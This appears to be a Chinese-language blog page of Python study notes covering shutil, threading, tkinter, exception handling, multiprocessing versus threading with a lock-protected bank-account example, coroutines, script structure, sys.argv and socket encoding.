<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br><span class="line">shutil.copymode(&apos;./test.txt&apos;,&apos;./test2.txt&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="shutil-copystat-src-dst"><a href="#shutil-copystat-src-dst" class="headerlink" title="shutil.copystat(src,dst)"></a>shutil.copystat(src,dst)</h3><p>将src文件的权限，上次访问时间，上次修改时间以及src的标志复制到dst文件</p>
<h3 id="shutil-copy"><a href="#shutil-copy" class="headerlink" title="shutil.copy()"></a>shutil.copy()</h3><p>复制文件，权限会一并被复制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shutil.copy(src,dst)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import shutil</span><br><span class="line">shutil.copy(&apos;./test.txt&apos;,&apos;./test1.txt&apos;)</span><br></pre></td></tr></table></figure>
<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><h3 id="threading-Thread"><a href="#threading-Thread" class="headerlink" title="threading.Thread()"></a>threading.Thread()</h3><p>创建新的线程</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">threading.Thread(target = study, args = (&apos;chessur&apos;, ),daemon = True)</span><br></pre></td></tr></table></figure>
<p>target是目标函数，args是目标函数的参数，daemon表示守护进程，主线程退出就不再保留执行</p>
<h3 id="threading-Thread-start"><a href="#threading-Thread-start" class="headerlink" title="threading.Thread.start()"></a>threading.Thread.start()</h3><p>启动线程</p>
<h3 id="threading-Thread-join"><a href="#threading-Thread-join" class="headerlink" title="threading.Thread.join()"></a>threading.Thread.join()</h3><p>等待完成</p>
<h3 id="threading-Lock"><a href="#threading-Lock" class="headerlink" title="threading.Lock()"></a>threading.Lock()</h3><p>创建锁对象</p>
<h3 id="threading-Lock-acquire"><a href="#threading-Lock-acquire" class="headerlink" title="threading.Lock().acquire()"></a>threading.Lock().acquire()</h3><p>获取锁</p>
<h3 id="threading-Lock-release"><a href="#threading-Lock-release" class="headerlink" title="threading.Lock().release()"></a>threading.Lock().release()</h3><p>释放锁</p>
<h2 id="tkinter模块"><a href="#tkinter模块" class="headerlink" title="tkinter模块"></a>tkinter模块</h2><p>提供图形化界面</p>
<h3 id="tkinter-Tk"><a href="#tkinter-Tk" class="headerlink" title="tkinter.Tk()"></a>tkinter.Tk()</h3><p>主界面</p>
<h3 id="tkinter-Tk-title"><a href="#tkinter-Tk-title" class="headerlink" title="tkinter.Tk().title()"></a>tkinter.Tk().title()</h3><p>主界面标题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import tkinter</span><br><span class="line"></span><br><span class="line">tkinter.Tk().title(&apos;chessur&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="tkinter-Tk-geometry"><a href="#tkinter-Tk-geometry" class="headerlink" title="tkinter.Tk().geometry()"></a>tkinter.Tk().geometry()</h3><p>主界面大小</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import tkinter</span><br><span class="line"></span><br><span class="line">tkinter.Tk().geometry(&apos;120x120&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="tkinter-Tk-wm-attributes"><a href="#tkinter-Tk-wm-attributes" class="headerlink" title="tkinter.Tk().wm_attributes()"></a>tkinter.Tk().wm_attributes()</h3><p>设置属性</p>
<table>
<thead>
<tr>
<th style="text-align:center">参数</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">-topmost</td>
<td style="text-align:center">指定是否是一个永远最前的窗口</td>
</tr>
<tr>
<td style="text-align:center">-alpha</td>
<td style="text-align:center">指定顶层窗口的透明度。0(完全透明)到1(不透明)</td>
</tr>
<tr>
<td style="text-align:center">-fullscreen</td>
<td style="text-align:center">设置是否占据整个屏幕</td>
</tr>
</tbody>
</table>
<h3 id="tkinter-Button"><a href="#tkinter-Button" class="headerlink" title="tkinter.Button()"></a>tkinter.Button()</h3><p>生成按钮</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tkinter.Button(master = None, text = &apos;Study&apos;, command = study)</span><br></pre></td></tr></table></figure>
<h3 id="tkinter-Button-config"><a href="#tkinter-Button-config" class="headerlink" title="tkinter.Button().config()"></a>tkinter.Button().config()</h3><p>设置按钮属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tkinter.Button().config(state = tkinter.NORMAL)</span><br><span class="line">tkinter.Button().config(state = tkinter.DISABLED)</span><br></pre></td></tr></table></figure>
<h3 id="tkinter-Button-pack"><a href="#tkinter-Button-pack" class="headerlink" title="tkinter.Button().pack()"></a>tkinter.Button().pack()</h3><p>设置按钮位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tkinter.Button().pack(side = &apos;TOP&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="tkiter-messagebox-showinfo"><a href="#tkiter-messagebox-showinfo" class="headerlink" title="tkiter.messagebox.showinfo()"></a>tkiter.messagebox.showinfo()</h3><p>显示提示信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import tkinter.messagebox</span><br><span class="line"></span><br><span class="line">tkinter.messagebox.showinfo(&apos;提示&apos;,&apos;chessur升至60级&apos;)</span><br></pre></td></tr></table></figure>
<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>使用<code>try</code>、<code>except</code>、<code>finally</code></p>
<p><code>try</code>写执行的代码<br><code>except</code>尝试抓捕的异常<br><code>finally</code>不管有没有异常都会执行的代码</p>
<h2 id="Python标准异常"><a href="#Python标准异常" class="headerlink" title="Python标准异常"></a>Python标准异常</h2><table>
<thead>
<tr>
<th style="text-align:center">名称</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">BaseException</td>
<td style="text-align:center">所有异类的基类</td>
</tr>
<tr>
<td style="text-align:center">ZeroDivisionError</td>
<td style="text-align:center">除(或取模)零</td>
</tr>
<tr>
<td style="text-align:center">IndexError</td>
<td style="text-align:center">序列中没有此索引(Index)</td>
</tr>
<tr>
<td style="text-align:center">ValueError</td>
<td style="text-align:center">传入无效的参数</td>
</tr>
<tr>
<td style="text-align:center">TypeError</td>
<td style="text-align:center">对类型无效的操作</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    ...</span><br><span class="line">except (Error1,Error2) as msg:</span><br><span class="line">    print(msg)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    ...</span><br><span class="line">except Error1:</span><br><span class="line">    print(&apos;Error1&apos;)</span><br><span class="line">except Error2:</span><br><span class="line">    print(&apos;Error2&apos;)</span><br></pre></td></tr></table></figure>
<h1 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h1><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>进程是操作系统中执行的一个程序，操作系统以进程为单位分配存储空间。</p>
<p>Unix和Linux系统提供了<code>fork()</code>系统调用来创建进程，调用<code>fork()</code>函数的是父进程，创建出的是子进程，子进程是父进程的一个拷贝，但是子进程拥有自己的PID。<code>fork()</code>函数会返回两次，父进程中可以通过<code>fork()</code>函数的返回值得到子进程的PID，而子进程的返回值永远都是0。Python的os模块提供了<code>fork()</code>函数。</p>
<p>Windows系统没有<code>fork()</code>调用，可以使用<code>multiprocessing</code>模块的<code>Process</code>类来创建子进程，该模块还提供了更高级的封装，例如批量启动进程的进程池(<code>Pool</code>)、用于进程间通信的队列(<code>Queue</code>)和管道(<code>Pipe</code>)</p>
<p>可以使用subprocess模块中的类和函数来创建和启动子进程，然后通过管道来和子进程通信。</p>
<h3 id="多进程实例"><a href="#多进程实例" class="headerlink" title="多进程实例"></a>多进程实例</h3><p>以做任务为例，单进程做任务就是做完一个任务，再做下一个任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from random import randint</span><br><span class="line">from time import sleep,time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def finish_quest(filename):</span><br><span class="line">    print(&apos;开始任务：%s&apos; %(filename))</span><br><span class="line">    time_to_finish = randint(5,10)</span><br><span class="line">    sleep(time_to_finish)</span><br><span class="line">    print(&apos;%s任务完成，耗时%d秒&apos; %(filename,time_to_finish))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    start = time()</span><br><span class="line">    finish_quest(&apos;杀死15只怪物&apos;)</span><br><span class="line">    finish_quest(&apos;解救15名NPC&apos;)</span><br><span class="line">    end = time()</span><br><span class="line">    print(&apos;共耗费%.2f秒&apos; %(end - start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">开始任务：杀死15只怪物</span><br><span class="line">杀死15只怪物任务完成，耗时5秒</span><br><span class="line">开始任务：解救15名NPC</span><br><span class="line">解救15名NPC任务完成，耗时5秒</span><br><span class="line">共耗费10.00秒</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
<p>多进程做任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from multiprocessing import Process</span><br><span class="line">from os import getpid</span><br><span class="line">from random import randint</span><br><span class="line">from time import sleep,time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def finish_quest(filename):</span><br><span class="line">    print(&apos;开始任务：%s&apos; %(filename))</span><br><span class="line">    time_to_finish = randint(5,10)</span><br><span class="line">    sleep(time_to_finish)</span><br><span class="line">    print(&apos;%s任务完成，耗时%d秒&apos; %(filename,time_to_finish))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    start = time()</span><br><span class="line">    p1 = Process(target = finish_quest,args = (&apos;杀死15只怪物&apos;,))</span><br><span class="line">    p2 = Process(target = finish_quest,args = (&apos;解救15名NPC&apos;,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line">    p1.join()</span><br><span class="line">    p2.join()</span><br><span class="line">    end = time()</span><br><span class="line">    print(&apos;共耗费%.2f秒&apos; %(end - start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">开始任务：杀死15只怪物</span><br><span class="line">开始任务：解救15名NPC</span><br><span class="line">杀死15只怪物任务完成，耗时6秒</span><br><span class="line">解救15名NPC任务完成，耗时8秒</span><br><span class="line">共耗费8.15秒</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>一个进程拥有多个并发的执行线索，简单的说拥有多个可以获得CPU调度的执行单元，这就是所谓的线程。由于线程是在同一个进程下，他们可以共享相同的上下文，因此相对于进程而言，进程间的信息共享和通信更加容易。</p>
<p>使用<code>threading</code>模块来实现多线程</p>
<p>多线程做任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from threading import Thread</span><br><span class="line">from random import randint</span><br><span class="line">from time import sleep,time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class finish_quest(Thread):</span><br><span class="line"></span><br><span class="line">    def __init__(self,filename):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self._filename = filename</span><br><span class="line">    </span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;开始任务：%s&apos; %(self._filename))</span><br><span class="line">        time_to_finish = randint(5,10)</span><br><span class="line">        sleep(time_to_finish)</span><br><span class="line">        print(&apos;%s任务完成，耗时%d秒&apos; %(self._filename,time_to_finish))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    start = time()</span><br><span class="line">    t1 = finish_quest(&apos;杀死15只怪物&apos;)</span><br><span class="line">    t2 = finish_quest(&apos;解救15名NPC&apos;)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line">    end = time()</span><br><span class="line">    print(&apos;共耗费%.2f秒&apos; %(end - start))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line">    </span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">开始任务：杀死15只怪物</span><br><span class="line">开始任务：解救15名NPC</span><br><span class="line">解救15名NPC任务完成，耗时5秒</span><br><span class="line">杀死15只怪物任务完成，耗时10秒</span><br><span class="line">共耗费10.00秒</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure>
<p>当多线程共享同一个变量(资源)时，会产生不可控的结果从而导致程序失效甚至崩溃。如果一个资源被多个线程竞争使用，这个资源被称为”临界资源”，”对临界资源”的访问需要加上保护，否则资源会处于”混乱”的状态</p>
<p>使用100个线程向同一个银行账户转账，此时，银行账户余额时一个临界资源，再没有保护的情况下，可能会得到错误的结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from time import sleep</span><br><span class="line">from threading import Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Account(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self._balance = 0</span><br><span class="line"></span><br><span class="line">    def deposit(self, money):</span><br><span class="line">        new_balance = self._balance + money</span><br><span class="line">        sleep(0.01)</span><br><span class="line">        self._balance = new_balance</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def balance(self):</span><br><span class="line">        return self._balance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AddMoneyThread(Thread):</span><br><span class="line"></span><br><span class="line">    def __init__(self, account, money):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self._account = account</span><br><span class="line">        self._money = money</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        self._account.deposit(self._money)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    account = Account()</span><br><span class="line">    threads = []</span><br><span class="line">    for _ in range(100):</span><br><span class="line">        t = AddMoneyThread(account, 1)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(&apos;账户余额为: ￥%d元&apos; % account.balance)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>执行结果远远小于100元，出现这种情况的原因是，没有对余额这个临界资源加以保护，多个线程同时转账时，会导致一起执行<code>new_balance = self._balance + money</code>，多个线程的账户余额都是初始状态下的0。</p>
<p>这种情况下，可以使用”锁”来保护临界资源，只有获得”锁”的线程可以访问临界资源，其他没有获得”锁”的线程只能被阻塞起来，直到获得”锁”的线程释放了”锁”，其他线程才有机会获得”锁”，这是才可以访问被保护的临界资源</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">from time import sleep</span><br><span class="line">from threading import Thread, Lock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Account(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self):</span><br><span class="line">        self._balance = 0</span><br><span class="line">        self._lock = Lock()</span><br><span class="line"></span><br><span class="line">    def deposit(self, money):</span><br><span class="line">        # 先获取锁才能执行后续的代码</span><br><span class="line">        self._lock.acquire()</span><br><span class="line">        try:</span><br><span class="line">            new_balance = self._balance + money</span><br><span class="line">            sleep(0.01)</span><br><span class="line">            self._balance = new_balance</span><br><span class="line">        finally:</span><br><span class="line">            # 在finally中执行释放锁的操作保证正常异常锁都能释放</span><br><span class="line">            self._lock.release()</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def balance(self):</span><br><span class="line">        return self._balance</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AddMoneyThread(Thread):</span><br><span class="line"></span><br><span class="line">    def __init__(self, account, money):</span><br><span class="line">        super().__init__()</span><br><span class="line">        self._account = account</span><br><span class="line">        self._money = money</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        self._account.deposit(self._money)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    account = Account()</span><br><span class="line">    threads = []</span><br><span class="line">    for _ in range(100):</span><br><span class="line">        t = AddMoneyThread(account, 1)</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    for t in threads:</span><br><span class="line">        t.join()</span><br><span class="line">    print(&apos;账户余额为: ￥%d元&apos; % account.balance)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>Python的多线程并不能发挥CPU的多核特性，这是因为Python的解释器有一个”全局解释器锁”(GIL)，任何线程执行前必须先获得GIL，然后没执行100条字节码，解释器就自动释放GIL，让别的线程有机会执行。</p>
<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>单进程单线程异步I/O模型，称为事件驱动模型。</p>
<p>在Python中，单线程+异步I/O的编程称为协程，有了协程的支持，就可以基于事件驱动编写高效的多任务程序。<br>协程最大的优势就是极高的执行效率，因为子程序切换不是线程切换，而是程序自身控制，因此，没有线程切换的开销。<br>协程的第二个优势就是不需要多线程的锁机制，只有一个线程，不存在同时写变量冲突，在协程中控制共享资源不用加锁，只要判断状态就好了，所以执行效率比多线程高很多。如果想要充分利用CPU的多核特性，最简单的方法是多进程+协程，既充分利用多核，又充分发挥协程的高效率。</p>
<h1 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h1><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import &lt;moudle1&gt;,&lt;module2&gt;</span><br><span class="line"></span><br><span class="line">def myFunction(): #自定函数</span><br><span class="line"></span><br><span class="line">def main():#定义主函数</span><br><span class="line">    myFunction()#调用函数</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:#调用时不会被直接执行</span><br><span class="line">	main()</span><br><span class="line">#Make a script both importable and executable</span><br></pre></td></tr></table></figure>
<p><code>if __name__ == &quot;__main__&quot;:</code></p>
<p>Python模块都包含内置的变量<code>__name__</code>，当运行模块被直接执行时，<code>__name__</code>等于<code>&quot;__main__&quot;</code>；如果import到其他模块中，则<code>__name__</code>等于模块名称(不包含后缀.py)。</p>
<p>直接运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#test.py</span><br><span class="line">print(&quot;First&quot;)</span><br><span class="line">print (&quot;%s&quot; %(__name__))</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    print (&quot;Second&quot;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//Output</span><br><span class="line">First</span><br><span class="line">__main__</span><br><span class="line">Second</span><br></pre></td></tr></table></figure>
<p>作为模块导入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#import_test.py</span><br><span class="line">import test</span><br><span class="line">print(&quot;======&quot;)</span><br><span class="line">print (__name__)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//Output</span><br><span class="line">First</span><br><span class="line">test</span><br><span class="line">======</span><br><span class="line">__main_</span><br></pre></td></tr></table></figure>
<p><code>def __inti__(self,):</code></p>
<p>在类的方法中，必须有<code>self</code>变量，因为python在调用方法时，会将self作为第一个参数传入方法，若不写<code>self</code>，会出现报错<br><code>__init__() takes 1 positional argument but 2 were given</code></p>
<p>dir(object)</p>
<p>以列表形式返回对象属性、方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#nslookup.py</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">class Domain:</span><br><span class="line">    def __init__(self,domain,port,protocol):</span><br><span class="line">        self.domain = domain</span><br><span class="line">        self.port = port</span><br><span class="line">        self.protocol =protocol</span><br><span class="line">    </span><br><span class="line">    def URL(self):</span><br><span class="line">        if self.protocol == &apos;https&apos;:</span><br><span class="line">            URL = &apos;https://&apos; + self.domain + &apos;:&apos; + self.port + &apos;/&apos;</span><br><span class="line">        if self.protocol == &apos;http&apos;:</span><br><span class="line">            URL = &apos;http://&apos; + self.domain + &apos;:&apos; + self.port + &apos;/&apos;</span><br><span class="line">        return URL</span><br><span class="line">    </span><br><span class="line">    def lookup(self):</span><br><span class="line">        os.system(&apos;nslookup&apos;+&apos; &apos;+self.domain)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    domain = Domain(&apos;www.chirec.github.io&apos;,&apos;80&apos;,&apos;http&apos;)</span><br><span class="line">    #print(dir(domain))</span><br><span class="line">    print(domain.URL())</span><br><span class="line">    print(domain.domain)</span><br><span class="line">    domain.lookup()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h2 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h2><p>sys模块可以让Python程序接收参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#sysExample.py</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">script = sys.argv[0]</span><br><span class="line">ip = sys.argv[1]</span><br><span class="line">port = sys.argv[2]</span><br><span class="line">print(&quot;[+] The script name is: &quot; + script)</span><br><span class="line">print(&quot;[+] The IP is:&quot; + ip + &quot; and port is: &quot; + port)</span><br></pre></td></tr></table></figure>
<h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><h3 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h3><p>报错<code>a bytes-like object is required, not &#39;str&#39;</code><br>Python2和Python3在套接字返回值解码上有区别<br>string类型可以通过encode()方法编码为指定的bytes<br>bytes类型可以通过decode()方法解码为str，或使用<code>bytes(str,&#39;UTF-8&#39;)</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket.send(string)</span><br></pre></td></tr></table></figure>
<p>将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</p>
